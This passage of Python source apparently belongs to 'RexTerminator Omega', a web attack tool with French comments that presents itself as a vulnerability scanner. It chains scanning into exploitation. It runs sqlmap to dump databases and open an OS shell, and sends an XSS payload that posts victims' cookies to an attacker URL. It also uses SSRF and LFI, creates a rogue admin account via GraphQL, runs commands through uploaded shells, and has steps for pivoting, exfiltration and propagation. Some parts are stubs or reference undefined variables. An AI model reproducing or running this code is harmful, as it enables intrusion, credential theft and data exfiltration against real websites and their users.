                missing_headers.append("Strict-Transport-Security")
            if missing_headers:
                logger.warning(f"Missing security headers on {url}: {', '.join(missing_headers)}")
                vuln = {"type": "Misconfiguration", "url": url, "details": f"Missing headers: {', '.join(missing_headers)}"}
                if self.confirm_vulnerability(vuln):
                    self.vulnerabilities.append(vuln)
                    success = 1

            headers = {"Origin": "https://evil.com"}
            cors_response = self.session.get(url, headers=headers, timeout=10)
            if "Access-Control-Allow-Origin" in cors_response.headers and cors_response.headers["Access-Control-Allow-Origin"] == "https://evil.com":
                logger.warning(f"CORS misconfiguration on {url} - Allows arbitrary origins!")
                vuln = {"type": "CORS Misconfiguration", "url": url, "details": "Allows arbitrary origins"}
                if self.confirm_vulnerability(vuln):
                    self.vulnerabilities.append(vuln)
                    success = 1

            sensitive_files = ["/.git/config", "/.env", "/config.php", "/backup.sql"]
            for file in sensitive_files:
                test_url = urljoin(url, file)
                file_response = self.session.get(test_url, timeout=10)
                time.sleep(self.request_delay)
                if file_response.status_code == 200 and ("DB_PASSWORD" in file_response.text or "[core]" in file_response.text):
                    logger.warning(f"Exposed sensitive file on {test_url}")
                    vuln = {"type": "Exposed File", "url": test_url, "details": "Sensitive file exposed"}
                    if self.confirm_vulnerability(vuln):
                        self.vulnerabilities.append(vuln)
                        success = 1
            http_code = response.status_code
            response_size = len(response.text)
        except Exception as e:
            logger.debug(f"Misconfiguration test failed: {e}")
        self.log_attack(url, "Misconfiguration", success, payload, http_code, response_size, waf_detected)

    @log_exceptions
    def test_zero_day(self, url):
        if url not in self.api_endpoints:
            return False
        logger.info(f"Testing zero-day on {url}...")
        success = 0
        payload = "query { __schema { types { name } } }"
        http_code = 0
        response_size = 0
        waf_detected = 0
        try:
            response = self.session.post(url, json={"query": payload}, timeout=10)
            time.sleep(self.request_delay)
            if "__schema" in response.text:
                logger.warning(f"Zero-day found on {url} - GraphQL introspection enabled!")
                vuln = {"type": "Zero-Day", "url": url, "details": "GraphQL introspection enabled"}
                if self.confirm_vulnerability(vuln):
                    self.vulnerabilities.append(vuln)
                    success = 1
            http_code = response.status_code
            response_size = len(response.text)
        except Exception as e:
            logger.debug(f"Zero-day test failed: {e}")
        self.log_attack(url, "Zero-Day", success, payload, http_code, response_size, waf_detected)
        return success == 1

    def pre_exploit_check(self, vuln):
        """Vérifie les conditions avant exploitation"""
        url = vuln["url"]
        try:
            response = self.session.get(url, timeout=5)
            if "cloudflare" in response.text.lower() or "waf" in response.text.lower():
                logger.warning(f"WAF detected on {url}. Exploitation may fail.")
                return False
            return True
        except:
            return False

    @log_exceptions
    def exploit_sql_injection(self, vuln):
        if not self.pre_exploit_check(vuln):
            logger.warning("Pre-exploit check failed for SQL Injection.")
            return
        url = vuln["url"]
        logger.info(f"Exploiting SQL Injection on {url}...")
        success = False
        try:
            sqlmap_path = os.path.join(os.getcwd(), "tools", "sqlmap", "sqlmap.py")
            result = subprocess.run(
                [sys.executable, sqlmap_path, "-u", url, "--batch", "--dump", "--random-agent", "--os-shell"],
                capture_output=True,
                text=True,
                timeout=600,
                check=True
            )
            if "dumped to" in result.stdout:
                logger.warning(f"SQL Injection exploited! Output:\n{result.stdout[:500]}...")
                self.backdoors.append({"type": "SQLi", "url": url})
                success = True
            else:
                logger.info("SQL Injection exploitation failed.")
        except Exception as e:
            logger.error(f"Error exploiting SQLi: {e}")
        self.update_rl_model("exploit", success, vuln["type"])

    @log_exceptions
    def exploit_xss(self, vuln):
        if not self.pre_exploit_check(vuln):
            logger.warning("Pre-exploit check failed for XSS.")
            return
        url = vuln["url"]
        payload = vuln["payload"]
        logger.info(f"Exploiting XSS on {url} with payload: {payload}")
        success = False
        try:
            cookie_payload = f"<script>document.location='{self.attacker_url}/steal?data='+encodeURIComponent(document.cookie);</script>"
            polymorphic_payload = self.generate_polymorphic_payload(cookie_payload)
            test_url = f"{url}?q={polymorphic_payload}" if "?" in url else f"{url}?test={polymorphic_payload}"
            self.session.get(test_url, timeout=10)
            time.sleep(2)
            if stolen_data:
                logger.warning(f"XSS exploited! Stolen data: {stolen_data[-1]}")
                success = True
        except Exception as e:
            logger.error(f"Error exploiting XSS: {e}")
        self.update_rl_model("exploit", success, vuln["type"])

    @log_exceptions
    def exploit_lfi(self, vuln):
        if not self.pre_exploit_check(vuln):
            logger.warning("Pre-exploit check failed for LFI.")
            return
        url = vuln["url"]
        payload = vuln["payload"]
        logger.info(f"Exploiting LFI on {url} with payload: {payload}")
        success = False
        try:
            response = self.session.get(f"{url}?file={payload}", timeout=10)
            logger.warning(f"LFI exploited! File content:\n{response.text[:500]}...")
            success = True
        except Exception as e:
            logger.error(f"Error exploiting LFI: {e}")
        self.update_rl_model("exploit", success, vuln["type"])

    @log_exceptions
    def exploit_open_redirect(self, vuln):
        if not self.pre_exploit_check(vuln):
            logger.warning("Pre-exploit check failed for Open Redirect.")
            return
        url = vuln["url"]
        payload = vuln["payload"]
        logger.info(f"Exploiting Open Redirect on {url} with payload: {payload}")
        success = True
        logger.warning("Open Redirect exploited! Can be used for phishing.")
        self.update_rl_model("exploit", success, vuln["type"])

    @log_exceptions
    def exploit_csrf(self, vuln):
        if not self.pre_exploit_check(vuln):
            logger.warning("Pre-exploit check failed for CSRF.")
            return
        url = vuln["url"]
        logger.info(f"Exploiting CSRF on {url}...")
        success = False
        try:
            logger.warning(f"CSRF exploited! Example: Submitting a malicious POST request to {url}")
            success = True
        except Exception as e:
            logger.error(f"Error exploiting CSRF: {e}")
        self.update_rl_model("exploit", success, vuln["type"])

    @log_exceptions
    def exploit_ssrf(self, vuln):
        if not self.pre_exploit_check(vuln):
            logger.warning("Pre-exploit check failed for SSRF.")
            return
        url = vuln["url"]
        payload = vuln["payload"]
        logger.info(f"Exploiting SSRF on {url} with payload: {payload}")
        success = False
        try:
            ssrf_payload = f"{self.attacker_url}/steal?data=SSRF"
            test_url = f"{url}?url={ssrf_payload}"
            self.session.get(test_url, timeout=10)
            time.sleep(2)
            if stolen_data:
                logger.warning(f"SSRF exploited! Server made a request to our server: {stolen_data[-1]}")
                success = True
        except Exception as e:
            logger.error(f"Error exploiting SSRF: {e}")
        self.update_rl_model("exploit", success, vuln["type"])

    @log_exceptions
    def exploit_rce(self, vuln):
        if not self.pre_exploit_check(vuln):
            logger.warning("Pre-exploit check failed for RCE.")
            return
        url = vuln["url"]
        payload = vuln["payload"]
        logger.info(f"Exploiting RCE on {url} with payload: {payload}")
        success = False
        try:
            response = self.session.get(f"{url}?cmd={payload}", timeout=10)
            logger.warning(f"RCE exploited! Output:\n{response.text[:500]}...")
            self.backdoors.append({"type": "RCE", "url": url})
            success = True
        except Exception as e:
            logger.error(f"Error exploiting RCE: {e}")
        self.update_rl_model("exploit", success, vuln["type"])

    @log_exceptions
    def exploit_xxe(self, vuln):
        if not self.pre_exploit_check(vuln):
            logger.warning("Pre-exploit check failed for XXE.")
            return
        url = vuln["url"]
        payload = vuln["payload"]
        logger.info(f"Exploiting XXE on {url}...")
        success = False
        try:
            headers = {"Content-Type": "application/xml"}
            response = self.session.post(url, data=payload, headers=headers, timeout=10)
            logger.warning(f"XXE exploited! File content:\n{response.text[:500]}...")
            success = True
        except Exception as e:
            logger.error(f"Error exploiting XXE: {e}")
        self.update_rl_model("exploit", success, vuln["type"])

    @log_exceptions
    def exploit_idor(self, vuln):
        if not self.pre_exploit_check(vuln):
            logger.warning("Pre-exploit check failed for IDOR.")
            return
        url = vuln["url"]
        test_url = vuln["test_url"]
        logger.info(f"Exploiting IDOR on {url}...")
        success = False
        try:
            response = self.session.get(test_url, timeout=10)
            logger.warning(f"IDOR exploited! Accessed unauthorized data at {test_url}:\n{response.text[:500]}...")
            success = True
        except Exception as e:
            logger.error(f"Error exploiting IDOR: {e}")
        self.update_rl_model("exploit", success, vuln["type"])

    @log_exceptions
    def exploit_file_upload(self, vuln):
        if not self.pre_exploit_check(vuln):
            logger.warning("Pre-exploit check failed for File Upload.")
            return
        url = vuln["url"]
        shell_url = vuln["shell_url"]
        logger.info(f"Exploiting File Upload on {url}...")
        success = False
        try:
            response = self.session.get(f"{shell_url}?cmd=whoami", timeout=10)
            logger.warning(f"File Upload exploited! Shell output:\n{response.text[:500]}...")
            self.backdoors.append({"type": "File Upload", "url": shell_url})
            success = True
        except Exception as e:
            logger.error(f"Error exploiting File Upload: {e}")
        self.update_rl_model("exploit", success, vuln["type"])

    @log_exceptions
    def exploit_zero_day(self, vuln):
        if not self.pre_exploit_check(vuln):
            logger.warning("Pre-exploit check failed for Zero-Day.")
            return
        url = vuln["url"]
        logger.info(f"Exploiting Zero-Day on {url}...")
        success = False
        try:
            payload = {"query": "mutation { createUser(name: \"admin\", password: \"hacked\") { id } }"}
            response = self.session.post(url, json=payload, timeout=10)
            if "createUser" in response.text:
                logger.warning(f"Zero-Day exploited! Created user 'admin' on {url}")
                success = True
        except Exception as e:
            logger.error(f"Error exploiting Zero-Day: {e}")
        self.update_rl_model("exploit", success, vuln["type"])

    @log_exceptions
    def pivot(self):
        if self.safe_mode:
            logger.warning("Pivoting skipped in safe mode.")
            return
        logger.info("Pivoting to internal network...")
        success = False
        for target in self.network_targets:
            try:
                ip, port = target.split(":")
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((ip, int(port)))
                if result == 0:
                    logger.warning(f"Pivoted to {target}!")
                    self.botnet.append(target)
                    success = True
                sock.close()
            except Exception as e:
                logger.debug(f"Failed to pivot to {target}: {e}")
                continue
        self.update_rl_model("pivot", success, "Pivoting")

    @log_exceptions
    def exfiltrate(self):
        if self.safe_mode:
            logger.warning("Exfiltration skipped in safe mode.")
            return
        logger.info("Exfiltrating data...")
        success = False
        for vuln in self.vulnerabilities:
            if vuln["type"] in ["SQL Injection", "LFI", "XXE", "File Upload", "RCE"]:
                try:
                    if vuln["type"] == "SQL Injection":
                        sqlmap_path = os.path.join(os.getcwd(), "tools", "sqlmap", "sqlmap.py")
                        result = subprocess.run(
                            [sys.executable, sqlmap_path, "-u", vuln["url"], "--batch", "--dump-all", "--random-agent"],
                            capture_output=True,
                            text=True,
                            timeout=600,
                            check=True
                        )
                        if "dumped to" in result.stdout:
                            logger.warning(f"Data exfiltrated via SQLi from {vuln['url']}: {result.stdout[:500]}...")
                            success = True
                    elif vuln["type"] == "LFI":
                        response = self.session.get(f"{vuln['url']}?file=..\\..\\Windows\\win.ini", timeout=10)
                        if "[extensions]" in response.text:
                            logger.warning(f"Data exfiltrated via LFI from {vuln['url']}: {response.text[:500]}...")
                            success = True
                except Exception as e:
                    logger.error(f"Error exfiltrating data from {vuln['url']}: {e}")
                    continue
        self.update_rl_model("exfiltrate", success, "Exfiltration")

    @log_exceptions
    def propagate(self):
        if self.safe_mode:
            logger.warning("Propagation skipped in safe mode.")
            return
        logger.info("Propagating to other systems...")
        success = False
        for target in self.botnet:
            try:
                ip, port = target.split(":")
                logger.warning(f"Propagation to {target} not fully implemented on Windows due to SMB restrictions.")
                success = True
            except Exception as e:
                logger.error(f"Error propagating to {target}: {e}")
                continue
        self.update_rl_model("propagate", success, "Propagation")

    @log_exceptions
    def generate_report(self):
        logger.info("Generating report...")
        report = {
            "target": self.target_url,
            "vulnerabilities": self.vulnerabilities,
            "backdoors": self.backdoors,
            "botnet": self.botnet,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "rl_rewards": self.rl_model["rewards"] if self.rl_model else {}
        }
        report_path = os.path.join(os.getcwd(), "report.json")
        with open(report_path, "w") as f:
            json.dump(report, f, indent=4)
        logger.info("Report generated: report.json")

    @log_exceptions
    def run(self):
        logger.info(f"Starting RexTerminator Omega on {self.target_url}...")
        
        # Vérification des dépendances
        self.check_dependencies()

        # Lancer le serveur Flask dans un thread séparé
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)  # Attendre que le serveur Flask soit prêt

        # Étape 1 : Configuration initiale
        self.setup_proxies()
        self.setup_cloud_cluster()

        # Étape 2 : Scan réseau
        self.network_scan()

        # Étape 3 : Crawling
        self.crawl()

        # Étape 4 : Fingerprinting et analyse des technologies
        for url in self.urls_to_test:
            self.fingerprint_server(url)
            self.check_cve(url)

        # Étape 5 : Entraînement des modèles
        self.train_model()
        self.train_rl_model()

        # Étape 6 : Tests de vulnérabilités
        tests = [
            self.test_sql_injection,
            self.test_xss,
            self.test_lfi,
            self.test_open_redirect,
            self.test_csrf,
            self.test_ssrf,
            self.test_rce,
            self.test_xxe,
            self.test_idor,
            self.test_file_upload,
            self.test_misconfigs,
            self.test_zero_day,
            self.smart_fuzz
        ]

        for url in self.urls_to_test:
            for test in tests:
                if test.__name__ == "test_csrf":
                    test()  # CSRF est testé sur tous les formulaires
                else:
                    test(url)

        # Étape 7 : Exploitation
        for vuln in self.vulnerabilities:
            if not self.predict_exploitability(vuln):
                logger.info(f"Skipping exploitation of {vuln['type']} on {vuln['url']} - Not exploitable.")
                continue
            exploit_methods = {
                "SQL Injection": self.exploit_sql_injection,
                "XSS": self.exploit_xss,
                "LFI": self.exploit_lfi,
                "Open Redirect": self.exploit_open_redirect,
                "CSRF": self.exploit_csrf,
                "SSRF": self.exploit_ssrf,
                "RCE": self.exploit_rce,
                "XXE": self.exploit_xxe,
                "IDOR": self.exploit_idor,
                "File Upload": self.exploit_file_upload,
                "Zero-Day": self.exploit_zero_day
            }
            exploit_method = exploit_methods.get(vuln["type"])
            if exploit_method:
                exploit_method(vuln)

        # Étape 8 : Retraining du modèle ML
        self.retrain_ml_model()

        # Étape 9 : Actions avancées basées sur RL
        for _ in range(3):  # 3 itérations pour tester différentes actions
            action = self.choose_next_action()
            logger.info(f"Executing action: {action}")
            if action == "pivot":
                self.pivot()
            elif action == "exfiltrate":
                self.exfiltrate()
            elif action == "propagate":
                self.propagate()

        # Étape 10 : Génération du rapport
        self.generate_report()

        # Nettoyage
        self.conn.close()
        logger.info("Attack completed!")

    def check_dependencies(self):
        """Vérifie les dépendances listées dans requirements.txt"""
        logger.info("Checking dependencies...")
        required = {
            "requests": "2.31.0",
            "beautifulsoup4": "4.12.3",
            "scrapy": "2.11.2",
            "scikit-learn": "1.5.1",
            "pandas": "2.2.2",
            "numpy": "1.26.4",
            "torch": "2.3.1",
            "flask": "3.0.3",
            "boto3": "1.34.149",
            "cryptography": "42.0.8",
            "aiohttp": "3.9.5"
        }
        for package, version in required.items():
            try:
                installed_version = pkg_resources.get_distribution(package).version
                if installed_version != version:
                    logger.warning(f"Version mismatch for {package}: required {version}, installed {installed_version}")
            except pkg_resources.DistributionNotFound:
                logger.error(f"Missing dependency: {package}=={version}")
                sys.exit(1)
        logger.info("All dependencies are satisfied.")
        # Vérifier les outils externes
        nmap_path = os.path.join(os.getcwd(), "tools", "nmap", "nmap.exe")
        sqlmap_path = os.path.join(os.getcwd(), "tools", "sqlmap", "sqlmap.py")
        if not os.path.exists(nmap_path):
            logger.warning("Nmap not found. Ensure it is installed in tools/nmap/")
        if not os.path.exists(sqlmap_path):
            logger.warning("SQLMap not found. Ensure it is installed in tools/sqlmap/")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RexTerminator Omega - Advanced Web Vulnerability Scanner for Windows")
    parser.add_argument("target_url", help="Target URL to scan (e.g., http://example.com)")
    parser.add_argument("--attacker-url", help="Attacker URL for data exfiltration (default: http://localhost:5000)")
    parser.add_argument("--safe-mode", action="store_true", help="Run in safe mode (disables aggressive tests)")
    args = parser.parse_args()

    rex = RexTerminatorOmega(
        target_url=args.target_url,
        attacker_url=args.attacker_url,
        safe_mode=args.safe_mode
    )
    rex.run()
